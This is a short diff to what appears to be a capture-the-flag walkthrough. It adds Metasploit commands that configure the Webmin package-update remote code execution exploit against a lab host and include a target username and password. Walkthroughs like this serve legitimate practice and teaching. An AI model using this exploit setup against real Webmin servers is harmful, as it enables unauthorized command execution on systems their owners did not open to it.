@@ -186,5 +186,16 @@ msfdb run
 * Type the following commands to configure the exploit:
 
 ```
+use exploit/linux/http/webmin_packageup_rce
+set rhosts 10.10.10.160
+set lhost tun0
+set ssl true
+set username Matt
+set password computer2008
 
 ```
+
+
+
+
+
